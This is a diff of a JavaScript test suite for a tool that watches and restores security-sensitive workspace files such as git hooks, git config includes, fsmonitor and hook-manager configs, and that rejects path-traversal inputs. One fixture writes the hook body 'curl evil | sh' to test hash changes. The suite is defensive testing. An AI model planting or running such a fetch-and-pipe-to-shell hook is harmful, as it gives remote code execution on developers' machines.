@@ -333,7 +333,8 @@ test('the watchlist (ws.sensitive / ws.restore): the watched files with hashes a
   fs.symlinkSync(path.join(ROOT, 'outside', 'secret.txt'), path.join(WS, '.vscode', 'tasks.json'));   // a link: reported as one
   let r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
   const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
-  assert.deepEqual(Object.keys(by).sort(), ['.envrc', '.git/config', '.git/hooks', '.git/hooks/pre-push', '.husky', '.husky/pre-commit', '.vscode/tasks.json', 'package.json']);
+  assert.deepEqual(Object.keys(by).sort(), ['.envrc', '.git', '.git/config', '.git/hooks', '.git/hooks/pre-push', '.husky', '.husky/pre-commit', '.vscode/tasks.json', 'package.json']);
+  assert.deepEqual([by['.git'].type, by['.git'].kind, by['.git/config'].kind, by['.git/hooks/pre-push'].kind, by['.husky/pre-commit'].kind], ['dir', 'git-dir', 'git-config', 'git-hook', 'husky']);
   assert.equal(Buffer.from(by['.git/hooks/pre-push'].data, 'base64').toString(), 'echo push\n');
   assert.equal(by['.git/hooks/pre-push'].mode & 0o777, 0o755);
   assert.match(by['.git/config'].sha256, /^[0-9a-f]{64}$/);
@@ -370,4 +371,57 @@ test('the watchlist (ws.sensitive / ws.restore): the watched files with hashes a
   assert.equal(fs.readdirSync(path.join(ROOT, 'outside', 'dotclaude')).length, 0, 'nothing written through the linked folder');
   assert.equal(result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).files.some((f) => f.path.startsWith('.claude/')), false, 'nor read through it');
   fs.rmSync(path.join(WS, '.claude'));
+});
+
+
+test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in the workspace, a gitdir file, submodules, hook managers, linked hooks', async () => {
+  const W2 = path.join(ROOT, 'ws2-src');   // (the workspace of this test: the same one, reset)
+  const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); };
+  for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
+  w('.git/config', '[core]\n\thooksPath = .githooks\n\tfsmonitor = tools/fsmon.sh\n[include]\n\tpath = ../gitinc.cfg\n[includeIf "gitdir:/x/"]\n\tpath = /etc/outside.cfg\n');
+  w('gitinc.cfg', '[core]\n\thooksPath = .husky/_\n');
+  w('.githooks/pre-commit', 'npm test\n', 0o755);
+  w('.husky/_/h', '#!/bin/sh\n');
+  w('tools/fsmon.sh', 'echo fsmon\n');
+  w('.git/modules/sub/config', '[core]\n');
+  w('.git/modules/sub/hooks/post-checkout', 'x\n');
+  for (const f of ['.pre-commit-config.yaml', 'lefthook.yml', '.lintstagedrc.json', '.yarnrc.yml', '.npmrc', '.pnpmfile.cjs', 'proj.code-workspace',
+    '.devcontainer/py/devcontainer.json', 'Makefile', 'pyproject.toml', '.nvmrc', '.env']) w(f, 'x\n');
+  w('hooks-src/pre-push', 'echo linked\n');
+  fs.mkdirSync(path.join(WS, '.git/hooks'), { recursive: true });
+  fs.symlinkSync(path.join(WS, 'hooks-src/pre-push'), path.join(WS, '.git/hooks/pre-push'));
+  let r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
+  for (const p of ['.githooks/pre-commit', '.husky/_/h', 'gitinc.cfg', 'tools/fsmon.sh', '.git/modules/sub/config', '.git/modules/sub/hooks/post-checkout',
+    '.pre-commit-config.yaml', 'lefthook.yml', '.lintstagedrc.json', '.yarnrc.yml', '.npmrc', '.pnpmfile.cjs', 'proj.code-workspace',
+    '.devcontainer/py/devcontainer.json', '.git/hooks/pre-push']) assert.ok(by[p], p);
+  for (const p of ['Makefile', 'pyproject.toml', '.nvmrc', '.env', 'hooks-src/pre-push']) assert.equal(by[p], undefined, p);
+  assert.equal(Object.keys(by).some((p) => p.includes('outside') || p.startsWith('/') || p.includes('..')), false, 'nothing outside the workspace');
+  assert.deepEqual([by['.githooks/pre-commit'].kind, by['gitinc.cfg'].kind, by['tools/fsmon.sh'].kind], ['git-hook', 'git-config', 'fsmonitor']);
+  // a linked hook: what it points to (in the workspace) counts
+  const before = by['.git/hooks/pre-push'].sha256;
+  w('hooks-src/pre-push', 'curl evil | sh\n');
+  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  assert.notEqual(r.files.find((f) => f.path === '.git/hooks/pre-push').sha256, before, 'a changed link target changes the hook\'s hash');
+  // a hooksPath hook can be put back (a new one goes to the trash); "." and ".." never pass
+  const pc = r.files.find((f) => f.path === '.githooks/pre-commit');
+  let x = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.githooks/pre-commit', ifSha256: pc.sha256, data: null })]));
+  assert.equal(x.action, 'trashed');
+  for (const bad of ['.githooks/../package.json', './.envrc', '.git/hooks/.', 'hooks-src/pre-push']) {
+    assert.ok(result(await talk(SOCK, [open({ op: 'ws.restore', path: bad, ifSha256: null, data: null })])).error, bad);
+  }
+  assert.equal(coded.watchRel('a/../b'), false); assert.equal(coded.watchRel('./a'), false); assert.equal(coded.watchRel('a'), true);
+  // a .git file (a worktree or submodule checkout): reported, and its gitdir followed when it is in the workspace
+  fs.rmSync(path.join(WS, '.git'), { recursive: true, force: true });
+  w('.git', 'gitdir: other/.gitdir\n');
+  w('other/.gitdir/config', '[core]\n');
+  w('other/.gitdir/hooks/pre-commit', 'x\n');
+  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  const g = Object.fromEntries(r.files.map((f) => [f.path, f]));
+  assert.equal(g['.git'].type, 'file');
+  assert.ok(g['other/.gitdir/config'] && g['other/.gitdir/hooks/pre-commit'], Object.keys(g).join(' '));
+  w('.git', 'gitdir: /somewhere/else\n');
+  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  assert.equal(r.files.some((f) => f.path.startsWith('other/')), false, 'a gitdir outside: only the .git file itself');
+  void W2;
 });
